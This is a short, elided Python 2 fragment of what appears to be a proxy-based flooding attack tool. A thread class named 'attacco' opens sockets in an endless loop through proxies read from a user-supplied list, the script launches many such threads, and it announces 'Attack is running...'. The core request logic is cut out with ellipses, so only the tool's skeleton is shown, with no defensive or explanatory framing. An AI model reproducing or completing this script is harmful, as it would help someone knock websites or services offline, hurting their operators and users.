...
class attacco(threading.Thread):
    def run(self):
        ...
        while 1:
			try:
				a = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Proxy 
...
in_file = open(raw_input("Proxylist: "),"r")
proxyf = in_file.read()
in_file.close()
...
for x in xrange(thread):
    attacco().start()
    print "\033[1;34;40mThread " + str(x) + " started!\033[0m"
    
print "\033[1;31;40mAttack is running...\033[0m"
